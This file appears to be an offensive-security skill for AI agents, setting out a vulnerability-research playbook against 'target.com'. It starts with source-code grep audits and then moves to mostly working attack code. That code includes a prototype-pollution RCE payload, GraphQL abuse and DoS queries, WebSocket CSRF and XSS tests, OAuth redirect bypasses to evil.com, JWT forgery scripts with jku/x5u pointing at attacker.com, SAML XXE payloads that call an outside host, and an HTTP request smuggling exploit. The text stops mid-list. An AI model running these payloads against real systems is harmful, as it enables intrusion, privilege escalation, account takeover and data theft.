---
description: Zero-day and vulnerability research methodology for authorized offensive security engagements. Covers source code review per language (PHP/Python/Node/Ruby/Java/Go/.NET), prototype pollution, GraphQL attacks, WebSocket security, OAuth/OIDC attacks, JWT attacks (none/confusion/jwks/kid/jku), SAML attacks, HTTP request smuggling (CL.TE/TE.CL/TE.TE), cache poisoning, business logic flaws, race conditions, mass assignment, IDOR hunting, subdomain takeover, XXE OOB, SSTI per engine (Jinja2/Twig/Freemarker/Velocity/ERB/Mako/Smarty/Pebble), and CVE-class pattern recognition. Load when researching vulnerabilities on a target.
---

# ZERO-DAY AND VULNERABILITY RESEARCH SKILL

## PHASE 1 — SOURCE CODE REVIEW

### PHP

```bash
grep -rn "eval\s*(\|exec\s*(\|system\s*(\|passthru\s*(\|shell_exec\s*(\|proc_open\|popen\s*(" \
  --include="*.php" ./ | grep -v "^\s*//" | tee audit_php_rce.txt
grep -rn '`.*\$_' --include="*.php" ./ | tee -a audit_php_rce.txt

grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" --include="*.php" ./ \
  | grep -iE "query|mysql_query|mysqli_query|PDO.*query|execute|select|insert|update|delete" \
  | grep -v "htmlspecialchars\|intval\|is_int\|bindParam\|bindValue\|prepare" \
  | tee audit_php_sqli.txt

grep -rn "include\s*(\|require\s*(\|include_once\s*(\|require_once\s*(" --include="*.php" ./ \
  | grep "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\.\.\/" | tee audit_php_lfi.txt

grep -rn "move_uploaded_file\|file_put_contents\|copy\s*(" --include="*.php" ./ \
  | grep "\$_FILES" | tee audit_php_upload.txt

grep -rn "unserialize\s*(" --include="*.php" ./ | tee audit_php_deserial.txt
grep -rn "__wakeup\|__destruct\|__toString\|__call\|__get\|__set" \
  --include="*.php" ./ | tee audit_php_gadgets.txt

grep -rn "curl_init\|curl_exec\|file_get_contents\s*(\|fopen\s*(\|fsockopen" \
  --include="*.php" ./ \
  | grep "\$_\|param\|url\|host\|target\|redirect\|request" | tee audit_php_ssrf.txt

grep -rn "echo\s\|print\s\|printf\s*(" --include="*.php" ./ \
  | grep "\$_GET\|\$_POST\|\$_REQUEST" \
  | grep -v "htmlspecialchars\|htmlentities\|strip_tags\|esc_html" | tee audit_php_xss.txt

grep -rn "header.*Location\|header.*location" --include="*.php" ./ \
  | grep "\$_GET\|\$_POST\|\$_REQUEST" | tee audit_php_redirect.txt

grep -rn "==\b\|!=\b\|in_array\|strcmp\|strcasecmp\|strncmp\|switch\s*(" \
  --include="*.php" ./ | grep -v "===" | head -100 | tee audit_php_typejuggling.txt

grep -rn "simplexml_load_string\|simplexml_load_file\|DOMDocument\|xml_parse\|libxml_disable_entity_loader" \
  --include="*.php" ./ | tee audit_php_xxe.txt

grep -rn "\.new\s*(params\|\.update\s*(params\|\.create\s*(params\|request\(\)->all\(\)\|Input::all" \
  --include="*.php" ./ | tee audit_php_massassign.txt
```

### Python / Django / Flask

```bash
grep -rn "\.raw\s*(\|\.execute\s*(\|cursor\.execute\|extra\s*(select\|RawSQL\|connection\.cursor" \
  --include="*.py" ./ | grep -v "parameterized\|bindparam\|%s.*," | tee audit_py_sqli.txt

grep -rn "render_template_string\|Markup\s*(\|jinja2\.Template\|Environment.*from_string\|Template\s*(" \
  --include="*.py" ./ | grep "request\.\|input\|user\|param\|data" | tee audit_py_ssti.txt
grep -rn "mark_safe\s*(\|format_html.*%s\|escape=False" --include="*.py" ./ | tee -a audit_py_ssti.txt

grep -rn "os\.system\s*(\|subprocess\.call\|subprocess\.run\|subprocess\.Popen\|os\.popen\|commands\." \
  --include="*.py" ./ \
  | grep -v "#" | grep "shell=True\|str(\|format(\|\$\|user\|input\|param\|request\." | tee audit_py_cmdi.txt

grep -rn "pickle\.loads\|pickle\.load\|yaml\.load\s*(\|marshal\.loads\|shelve\.open\|jsonpickle" \
  --include="*.py" ./ | grep -v "yaml\.safe_load\|yaml\.full_load\|#" | tee audit_py_deserial.txt

grep -rn "requests\.get\|requests\.post\|urllib\.request\|urllib2\.urlopen\|httplib\|http\.client" \
  --include="*.py" ./ | grep "request\.\|param\|url\|user_input\|data\[" | tee audit_py_ssrf.txt

grep -rn "debug\s*=\s*True\|app\.run.*debug\|FLASK_DEBUG\s*=\s*1\|FLASK_ENV.*development" \
  --include="*.py" ./ | tee audit_py_debug.txt

grep -rn "fields\s*=\s*'__all__'\|fields\s*=\s*\"__all__\"\|exclude\s*=\s*\[\]" \
  --include="*.py" ./ | tee audit_py_massassign.txt

grep -rn "open\s*(\|send_file\s*(\|send_from_directory\s*(" --include="*.py" ./ \
  | grep "request\.\|param\|path\|filename\|name\|file" | tee audit_py_traversal.txt

grep -rn "etree\.parse\|etree\.fromstring\|ElementTree\.parse\|minidom\.parseString\|saxutils" \
  --include="*.py" ./ | tee audit_py_xxe.txt

grep -rn "redirect\s*(\|HttpResponseRedirect\s*(\|url_for\s*(" --include="*.py" ./ \
  | grep "request\.\|param\|next\|url\|redirect_to" | tee audit_py_redirect.txt
```

### Node.js / Express

```bash
grep -rn "exec\s*(\|execSync\s*(\|spawn\s*(\|execFile\s*(\|spawnSync\|eval\s*(" \
  --include="*.js" --include="*.ts" ./ \
  | grep "req\.\|param\|body\|query\|input\|user" | tee audit_node_cmdi.txt

grep -rn "query\s*(\|execute\s*(\|raw\s*(\|knex\.raw\|sequelize\.query" \
  --include="*.js" --include="*.ts" ./ \
  | grep "req\.\|param\|body\|query\[" | grep -v "?\s*,\|parameterized\|prepare" | tee audit_node_sqli.txt

grep -rn "merge\s*(\|extend\s*(\|deepMerge\|assign\s*(\|defaults\s*(\|lodash\|_.merge\|_.set" \
  --include="*.js" --include="*.ts" ./ | grep "req\.\|body\|param\|user\|input" | tee audit_node_proto.txt
grep -rn "\.__proto__\|constructor\[.prototype.\]\|prototype\[" \
  --include="*.js" --include="*.ts" ./ | tee -a audit_node_proto.txt

grep -rn "axios\.\|fetch\s*(\|request\s*(\|http\.get\|https\.get\|got\s*(" \
  --include="*.js" --include="*.ts" ./ \
  | grep "req\.\|param\|body\|url\|host\|target" | tee audit_node_ssrf.txt

grep -rn "unserialize\s*(\|node-serialize\|serialize-javascript\|deserialize\s*(" \
  --include="*.js" ./ | tee audit_node_deserial.txt

grep -rn "readFile\s*(\|readFileSync\s*(\|createReadStream\s*(\|sendFile\s*(\|res\.download\|serveStatic" \
  --include="*.js" --include="*.ts" ./ \
  | grep "req\.\|param\|body\|query\|user" | tee audit_node_traversal.txt

grep -rn "ejs\.render\|pug\.render\|handlebars\.compile\|nunjucks\.renderString\|mustache\.render" \
  --include="*.js" --include="*.ts" ./ \
  | grep "req\.\|param\|body\|user\|input" | tee audit_node_ssti.txt

grep -rn "\.find\s*(\|\.findOne\s*(\|\.update\s*(\|\.remove\s*(\|\.deleteOne\s*(\|\.aggregate\s*(" \
  --include="*.js" --include="*.ts" ./ \
  | grep "req\.body\|req\.query\|req\.params" | tee audit_node_nosqli.txt

grep -rn "jwt\.sign\|jwt\.verify\|jsonwebtoken" --include="*.js" --include="*.ts" ./ \
  | grep "secret\s*[=:]\s*['\"]" | tee audit_node_jwt.txt

grep -rn "\.create\s*(\|\.update\s*(\|\.findByIdAndUpdate\|Model\.build\|new.*Model\s*(" \
  --include="*.js" --include="*.ts" ./ | grep "req\.body\b" | tee audit_node_massassign.txt
```

### Ruby on Rails

```bash
grep -rn "\.where\s*(\".*#{\|\.find_by_sql\|\.execute\s*(\|ActiveRecord::Base\.connection" \
  --include="*.rb" ./ | tee audit_rb_sqli.txt
grep -rn "system\s*(\|exec\s*(\|`.*#{\|\%x(\|IO\.popen\|spawn\s*(" \
  --include="*.rb" ./ | grep "params\|request\|session\|user" | tee audit_rb_cmdi.txt
grep -rn "\.new\s*(params\|\.update\s*(params\|\.update_attributes\s*(params\|\.create\s*(params" \
  --include="*.rb" ./ | tee audit_rb_massassign.txt
grep -rn "permit!\s*\|permit(\s*)" --include="*.rb" ./ | tee -a audit_rb_massassign.txt
grep -rn "ERB\.new\s*(\|render.*inline.*\|render_to_string.*erb" \
  --include="*.rb" ./ | grep "params\|request\|user\|input" | tee audit_rb_ssti.txt
grep -rn "Marshal\.load\|YAML\.load\s*(\|Oj\.load\|JSON\.unsafe_load" \
  --include="*.rb" ./ | grep -v "safe_load\|#" | tee audit_rb_deserial.txt
grep -rn "redirect_to\s*(params\|redirect_to.*params" --include="*.rb" ./ | tee audit_rb_redirect.txt
```

### Java Spring

```bash
grep -rn "createNativeQuery\|createQuery\|executeQuery\|prepareStatement\|jdbcTemplate" \
  --include="*.java" ./ | grep -v "\?" | tee audit_java_sqli.txt
grep -rn "Runtime\.getRuntime\(\)\.exec\|ProcessBuilder\|ScriptEngine\|Class\.forName\|Method\.invoke" \
  --include="*.java" ./ | tee audit_java_rce.txt
grep -rn "ObjectInputStream\|readObject\s*(\|XMLDecoder\|XStream\|readResolve\|readExternal" \
  --include="*.java" ./ | tee audit_java_deserial.txt
grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory\|TransformerFactory" \
  --include="*.java" ./ | tee audit_java_xxe.txt
grep -rn "new URL\s*(\|openConnection\|HttpURLConnection\|RestTemplate\|WebClient\|OkHttpClient" \
  --include="*.java" ./ | grep "getParameter\|request\.\|@RequestParam\|@PathVariable" | tee audit_java_ssrf.txt
grep -rn "TemplateEngine\|FreeMarker\|VelocityEngine\|new Template\|processTemplate" \
  --include="*.java" ./ | grep "getParameter\|request\.\|model\." | tee audit_java_ssti.txt
grep -rn "@ModelAttribute\|@RequestBody" --include="*.java" ./ | tee audit_java_massassign.txt
```

### Go

```bash
grep -rn "\.Query\s*(\|\.Exec\s*(\|\.QueryRow\s*(" --include="*.go" ./ \
  | grep "fmt\.Sprintf\|+\s*r\.\|Sprintf" | grep -v "\?\|\$[0-9]" | tee audit_go_sqli.txt
grep -rn "exec\.Command\s*(" --include="*.go" ./ | grep "r\.\|Param\|Form\|Query" | tee audit_go_cmdi.txt
grep -rn "os\.Open\s*(\|ioutil\.ReadFile\s*(\|os\.ReadFile\|filepath\.Join\s*(" --include="*.go" ./ \
  | grep "r\.\|Param\|Form\|Query\|Var\|FormValue" | tee audit_go_traversal.txt
grep -rn "http\.Get\s*(\|http\.Post\s*(\|http\.NewRequest\|client\.Do\s*(" --include="*.go" ./ \
  | grep "r\.\|Param\|Form\|Query\|FormValue" | tee audit_go_ssrf.txt
grep -rn "template\.HTML\s*(\|template\.JS\s*(\|template\.URL\s*(\|tmpl\.Execute\s*(" \
  --include="*.go" ./ | grep "r\.\|Param\|Form\|Query" | tee audit_go_ssti.txt
```

### .NET / C#

```bash
grep -rn "SqlCommand\|OleDbCommand\|ExecuteQuery\|ExecuteReader\|FromSqlRaw\|FromSql\b" \
  --include="*.cs" ./ | grep 'Request\.\|"\s*+\|string\.Format' | tee audit_cs_sqli.txt
grep -rn "Process\.Start\|UseShellExecute\s*=\s*true\|Assembly\.Load\|Assembly\.LoadFrom\|Activator\.CreateInstance" \
  --include="*.cs" ./ | tee audit_cs_rce.txt
grep -rn "BinaryFormatter\|XmlSerializer\|DataContractSerializer\|NetDataContractSerializer\|JsonConvert\.DeserializeObject\|TypeNameHandling" \
  --include="*.cs" ./ | tee audit_cs_deserial.txt
grep -rn "TypeNameHandling\s*=\s*TypeNameHandling\." --include="*.cs" ./ \
  | grep -v "TypeNameHandling\.None" | tee -a audit_cs_deserial.txt
grep -rn "WebClient\s*(\|HttpClient\s*(\|WebRequest\.Create\|new Uri\s*(\|HttpWebRequest" \
  --include="*.cs" ./ | grep "Request\.\|Param\|Form\[" | tee audit_cs_ssrf.txt
grep -rn "@Html\.Raw\s*(\|IHtmlString\|HtmlString\s*(\|MarkupString" \
  --include="*.cs" --include="*.cshtml" ./ | grep "Request\.\|Param\|Form\[" | tee audit_cs_xss.txt
grep -rn "EnableViewStateMac\s*=\s*false\|ViewStateEncryptionMode\s*=\s*Never" \
  --include="*.cs" --include="*.aspx" --include="*.config" ./ | tee audit_cs_viewstate.txt
```

## PHASE 2 — PROTOTYPE POLLUTION

### Client-Side Detection

```bash
# Grep for merge/assign sinks in JS
grep -rn "Object\.assign\|_.merge\|_.extend\|\.merge\s*(\|\.extend\s*(\|deepMerge\|mergeDeep" \
  --include="*.js" ./ | tee proto_sinks.txt

# Test via URL parameters
# ?__proto__[testprop]=polluted
# ?constructor[prototype][testprop]=polluted
# ?__proto__.testprop=polluted

# Test via JSON body
curl -s -X POST $TARGET_URL/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"testprop":"polluted123"}}' | tee proto_test1.txt

curl -s -X POST $TARGET_URL/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"testprop":"polluted123"}}}' | tee proto_test2.txt

# Check if poll was successful
curl -s $TARGET_URL/api/settings | grep "polluted123" && echo "[+] PROTOTYPE POLLUTED!"

# Client-side XSS gadgets
grep -rn "innerHTML\|outerHTML\|document\.write\|eval\s*(\|setTimeout\s*(\|setInterval\s*(" \
  --include="*.js" ./ | tee proto_xss_gadgets.txt
```

### Server-Side Prototype Pollution (Node.js)

```bash
# Pug template engine RCE via SSPP
curl -s -X POST $TARGET_URL/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\"child_process\").execSync(\"id > /tmp/pwned\");var __tmp2"}}' \
  | tee sspp_pug_rce.txt

# Privilege escalation via property injection
curl -s -X POST $TARGET_URL/api/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true,"role":"admin","admin":true}}' | tee sspp_privesc.txt

curl -s -X POST $TARGET_URL/api/user \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}' | tee sspp_constructor.txt

# Status check after pollution
curl -s -H "Authorization: Bearer TOKEN" $TARGET_URL/api/admin | tee sspp_check.txt

# Find server-side merge sinks
grep -rn "_.merge\|lodash.*merge\|deepmerge\|merge(\s*{}\|merge(\s*req\." --include="*.js" ./ | tee sspp_sinks.txt
```

## PHASE 3 — GRAPHQL ATTACKS

```bash
GRAPHQL_URL="https://target.com/graphql"

# Introspection
curl -s -X POST $GRAPHQL_URL \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | jq . | tee gql_introspect.txt

# Full schema dump
curl -s -X POST $GRAPHQL_URL \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { kind name fields(includeDeprecated:true) { name args { name type { kind name } } type { kind name } } inputFields { name type { kind name } } } } }"}' \
  | jq . | tee gql_schema.txt

# Field suggestion attack (introspection disabled)
curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}' | tee gql_field_suggest.txt

# Batching attack
curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1){email}"},{"query":"{ user(id:2){email}"},{"query":"{ user(id:3){email}}"}]' \
  | jq . | tee gql_batching.txt

# Alias attack — bypass rate limits, mass enum
ALIAS_QUERY='{"query":"{ '
for i in $(seq 1 20); do
  ALIAS_QUERY+="u$i: user(id:$i){id email role} "
done
ALIAS_QUERY+='}"}'
curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" -d "$ALIAS_QUERY" | jq . | tee gql_alias.txt

# Deep recursion DoS
curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { friends { id } } } } } } }"}' | tee gql_recursion.txt

# Unauthenticated mutations
curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id:1) { success } }"}' | tee gql_unauth_delete.txt
curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateRole(userId:1,role:\"admin\") { success } }"}' | tee gql_privesc.txt

# IDOR via GraphQL
for id in $(seq 1 20); do
  curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
    -d "{\"query\":\"{ user(id:$id) { id email role } }\"}" | jq -c '{id:.data.user.id,email:.data.user.email}' >> gql_idor.txt
done

# GraphQL over GET (CSRF bypass)
curl -sG "$GRAPHQL_URL" --data-urlencode 'query={ users { id email } }' | tee gql_get.txt

# Injection in GraphQL args
curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
  -d '{"query":"{ users(filter:\"1=1 OR 1=1\") { id email } }"}' | tee gql_injection.txt
```

## PHASE 4 — WEBSOCKET SECURITY

```python
# websocket_test.py — run with: python3 websocket_test.py
import websocket, json, ssl, sys

TARGET_WS = "wss://target.com/ws"
VALID_TOKEN = "YOUR_SESSION_TOKEN"

results = []

def on_message(ws, msg):
    print(f"[RECV] {msg}")
    results.append(msg)

def on_error(ws, err):
    print(f"[ERR] {err}")

def on_close(ws, code, msg):
    print(f"[CLOSE] {code} {msg}")

# Test 1: Unauthenticated connection
def test_unauth():
    try:
        ws = websocket.create_connection(TARGET_WS, sslopt={"cert_reqs": ssl.CERT_NONE})
        print("[+] Unauthenticated connection accepted!")
        ws.send(json.dumps({"type": "getUsers"}))
        print(f"Response: {ws.recv()}")
        ws.close()
    except Exception as e:
        print(f"[-] Unauth blocked: {e}")

# Test 2: Cross-origin CSRF
def test_csrf():
    try:
        ws = websocket.create_connection(TARGET_WS,
            header={"Origin": "https://evil.com", "Cookie": f"session={VALID_TOKEN}"},
            sslopt={"cert_reqs": ssl.CERT_NONE})
        print("[+] Cross-origin accepted! CSRF via WebSocket possible")
        ws.send(json.dumps({"action": "deleteAccount", "confirm": True}))
        print(f"Response: {ws.recv()}")
        ws.close()
    except Exception as e:
        print(f"[-] Cross-origin blocked: {e}")

# Test 3: XSS via WebSocket message
def test_xss():
    try:
        ws = websocket.create_connection(TARGET_WS,
            header={"Cookie": f"session={VALID_TOKEN}"},
            sslopt={"cert_reqs": ssl.CERT_NONE})
        ws.send(json.dumps({"type": "message", "content": "<script>alert(document.domain)</script>"}))
        resp = ws.recv()
        if "<script>" in resp:
            print(f"[+] XSS reflected in WS response!")
        ws.close()
    except Exception as e:
        print(f"Error: {e}")

# Test 4: Auth bypass via message type manipulation
def test_auth_bypass():
    try:
        ws = websocket.create_connection(TARGET_WS, sslopt={"cert_reqs": ssl.CERT_NONE})
        # Try to send admin actions without auth
        for action in ["getAdminData", "listUsers", "getSecretKey", "dumpDatabase"]:
            ws.send(json.dumps({"type": action, "auth": None}))
            try:
                resp = ws.recv()
                print(f"{action}: {resp[:200]}")
            except:
                pass
        ws.close()
    except Exception as e:
        print(f"Error: {e}")

test_unauth()
test_csrf()
test_xss()
test_auth_bypass()
```

## PHASE 5 — OAUTH / OIDC ATTACKS

```bash
TARGET_URL="https://target.com"
OAUTH_SERVER="https://auth.target.com"
CLIENT_ID="discovered_from_js"

# Discover endpoints
curl -s "$TARGET_URL/.well-known/openid-configuration" | jq . | tee oauth_config.txt
AUTHZ_URL=$(jq -r '.authorization_endpoint' oauth_config.txt 2>/dev/null)
TOKEN_URL=$(jq -r '.token_endpoint' oauth_config.txt 2>/dev/null)

# 1. CSRF — missing state parameter
curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${TARGET_URL}/callback&scope=openid" \
  | grep -i "location\|state" | tee oauth_csrf.txt

# 2. redirect_uri bypass
for uri in \
  "${TARGET_URL}.evil.com/callback" \
  "${TARGET_URL}/callback/../../../evil" \
  "${TARGET_URL}/callbackXevil.com" \
  "https://evil.com" \
  "${TARGET_URL}/callback%40evil.com" \
  "https://evil.com%23${TARGET_URL}/callback" \
  "https://evil.com%2F@${TARGET_URL}/callback" \
  "${TARGET_URL}/callback?redirect=https://evil.com" \
  "javascript:alert(1)"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$uri'))")
  CODE=$(curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${ENC}&scope=openid" \
    -o /dev/null -w "%{http_code}")
  LOC=$(curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${ENC}&scope=openid" \
    | grep -i "location" | head -1)
  echo "$CODE $uri -> $LOC" | tee -a oauth_redirect_bypass.txt
done

# 3. Implicit flow token in URL fragment
curl -sI "${AUTHZ_URL}?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${TARGET_URL}/callback&scope=openid" \
  | grep -i "location\|access_token" | tee oauth_implicit.txt

# 4. PKCE bypass
curl -s -X POST $TOKEN_URL \
  -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=$CLIENT_ID&redirect_uri=${TARGET_URL}/callback" \
  | jq . | tee oauth_pkce_bypass.txt

# 5. State parameter entropy check
for i in $(seq 1 5); do
  STATE=$(curl -sI "${AUTHZ_URL}?response_type=code&client_id=$CLIENT_ID&scope=openid" \
    | grep -i "location" | grep -oP "state=[^&]+" | head -1)
  echo "state$i: $STATE" | tee -a oauth_state_entropy.txt
done

# 6. Account takeover via unverified email in JWT claim
curl -s $TOKEN_URL \
  -d "grant_type=authorization_code&code=VALID_CODE&client_id=$CLIENT_ID" \
  | python3 -c "
import json,sys,base64
d=json.load(sys.stdin)
id_token = d.get('id_token','')
if id_token:
    parts = id_token.split('.')
    payload = json.loads(base64.b64decode(parts[1]+'=='))
    print(json.dumps(payload, indent=2))
" | tee oauth_id_token.txt
```

## PHASE 6 — JWT ATTACKS

```python
# jwt_attacks.py
import base64, json, hmac, hashlib

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    return base64.b64decode(s + '==')

TARGET_JWT = "YOUR_JWT_HERE"  # replace with captured JWT
parts = TARGET_JWT.split('.')
header = json.loads(b64url_decode(parts[0]))
payload = json.loads(b64url_decode(parts[1]))
print(f"Header: {header}")
print(f"Payload: {payload}")

# Attack 1: none algorithm
payload_admin = payload.copy()
payload_admin['role'] = 'admin'
payload_admin['sub'] = 'admin'

for alg_none in ['none', 'None', 'NONE', 'nOnE', 'NoNe']:
    h = {'alg': alg_none, 'typ': 'JWT'}
    enc_h = b64url_encode(json.dumps(h, separators=(',', ':')))
    enc_p = b64url_encode(json.dumps(payload_admin, separators=(',', ':')))
    print(f"\nnone ({alg_none}): {enc_h}.{enc_p}.")

# Attack 2: weak secret brute force (offline)
# hashcat -a 0 -m 16500 TOKEN rockyou.txt
# john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt

# Attack 3: kid path traversal (sign with empty key)
h_kid = {'alg': 'HS256', 'kid': '../../dev/null', 'typ': 'JWT'}
enc_h_kid = b64url_encode(json.dumps(h_kid, separators=(',', ':')))
enc_p_admin = b64url_encode(json.dumps(payload_admin, separators=(',', ':')))
signing_input = f"{enc_h_kid}.{enc_p_admin}"
sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
enc_sig = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"\nkid=../../dev/null: {enc_h_kid}.{enc_p_admin}.{enc_sig}")

# Attack 4: kid SQL injection
for kid_payload in [
    "' UNION SELECT 'hacked_secret' -- ",
    "1' UNION SELECT 'hacked_secret'#",
    "../../etc/passwd",
]:
    h_sqli = {'alg': 'HS256', 'kid': kid_payload, 'typ': 'JWT'}
    enc_h2 = b64url_encode(json.dumps(h_sqli, separators=(',', ':')))
    for secret in ['hacked_secret', '', 'null', 'secret', 'password']:
        signing_input2 = f"{enc_h2}.{enc_p_admin}"
        sig2 = hmac.new(secret.encode(), signing_input2.encode(), hashlib.sha256).digest()
        enc_sig2 = base64.urlsafe_b64encode(sig2).rstrip(b'=').decode()
        print(f"\nkid SQLi ({kid_payload[:30]}..., secret={secret}):\n{enc_h2}.{enc_p_admin}.{enc_sig2}")
```

```bash
# RS256→HS256 confusion (requires public key)
# Fetch public key from JWKS
curl -s "$TARGET_URL/.well-known/jwks.json" | jq . | tee jwks.json
curl -s "$TARGET_URL/.well-known/openid-configuration" | jq -r '.jwks_uri' | xargs curl -s | jq . > jwks.json

# Use jwt_tool for RS256->HS256 confusion
python3 jwt_tool.py TARGET_JWT -X k -pk public_key.pem 2>/dev/null

# jku header injection (point to attacker-controlled JWKS)
python3 jwt_tool.py TARGET_JWT -X j -ju "https://attacker.com/jwks.json" 2>/dev/null

# x5u header injection
python3 jwt_tool.py TARGET_JWT -X x -xu "https://attacker.com/cert.crt" 2>/dev/null

# Brute force JWT secret
hashcat -a 0 -m 16500 "$JWT" /usr/share/wordlists/rockyou.txt 2>/dev/null
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt 2>/dev/null
```

## PHASE 7 — SAML ATTACKS

```bash
TARGET_URL="https://target.com"
SAML_ACS="$TARGET_URL/saml/acs"

# Decode SAML response
SAML_B64="PASTE_BASE64_HERE"
echo "$SAML_B64" | base64 -d | xmllint --format - 2>/dev/null | tee saml_decoded.xml

# Attack 1: XML comment injection in NameID
python3 << 'PYEOF'
import base64

# admin@target.com<!-- --> attacker@evil.com
# Parsed as admin@target.com by some validators
evil_nameid = "admin@target.com<!-- evil -->"

saml_xml = f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_test" Version="2.0" IssueInstant="2020-01-01T00:00:00Z">
  <saml:Assertion ID="_assertion" Version="2.0" IssueInstant="2020-01-01T00:00:00Z">
    <saml:Issuer>https://idp.target.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{evil_nameid}</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2100-01-01T00:00:00Z"/>
    <saml:AuthnStatement AuthnInstant="2020-01-01T00:00:00Z">
      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>"""

encoded = base64.b64encode(saml_xml.encode()).decode()
print(f"SAMLResponse={encoded}")
PYEOF

# Attack 2: XXE in SAML
python3 << 'PYEOF'
import base64

collab = "BURP_COLLABORATOR_HERE"
xxe_saml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{collab}/saml_xxe">
  %xxe;
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""

print(f"SAMLResponse={base64.b64encode(xxe_saml.encode()).decode()}")
PYEOF

# Attack 3: Signature wrapping — use saml-raider Burp extension or samlattacker
# Manual XSW: clone assertion, move signature to cover only original clone
echo "Use Burp SAML Raider extension for XSW attacks"
echo "Or: python3 samlattacker.py --response saml_decoded.xml --attack xsw1"
```

## PHASE 8 — HTTP REQUEST SMUGGLING

```python
# smuggle.py — CL.TE and TE.CL detection and exploitation
import socket, ssl, time, sys

def raw_request(host, port, data, timeout=10):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=timeout) as s:
        if port == 443:
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(data)
        time.sleep(2)
        response = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                response += chunk
        except:
            pass
        return response.decode(errors='replace')

HOST = "target.com"
PORT = 443

# CL.TE detection (timing)
cl_te_detect = (
    b"POST / HTTP/1.1\r\n"
    b"Host: " + HOST.encode() + b"\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: 4\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    b"1\r\n"
    b"A\r\n"
)
start = time.time()
print("Testing CL.TE...")
try:
    r = raw_request(HOST, PORT, cl_te_detect, timeout=12)
    elapsed = time.time() - start
    print(f"Response in {elapsed:.2f}s")
    if elapsed > 8:
        print("[+] LIKELY CL.TE VULNERABLE — backend timed out!")
    else:
        print(f"Response: {r[:200]}")
except socket.timeout:
    print(f"[+] TIMEOUT — CL.TE CONFIRMED!")

# CL.TE exploitation — smuggle GET /admin
cl_te_exploit = (
    b"POST / HTTP/1.1\r\n"
    b"Host: " + HOST.encode() + b"\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: 37\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    b"0\r\n"
    b"\r\n"
    b"GET /admin HTTP/1.1\r\n"
    b"X-Ignore: x"
)
print("\nSending CL.TE exploit...")
print(raw_request(HOST, PORT, cl_te_exploit)[:500])

# TE.CL detection
body = b"GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 5\r\n\r\nx=1\r\n"
chunk_size = hex(len(body))[2:].encode()
te_cl_detect = (
    b"POST / HTTP/1.1\r\n"
    b"Host: " + HOST.encode() + b"\r\n"
    b"Content-Length: 4\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n" +
    chunk_size + b"\r\n" +
    body +
    b"0\r\n\r\n"
)
print("\nTesting TE.CL...")
r2 = raw_request(HOST, PORT, te_cl_detect)
print(r2[:500])

# TE.TE obfuscation variants to try
te_variants = [
    b"Transfer-Encoding: xchunked",
    b"Transfer-Encoding : chunked",
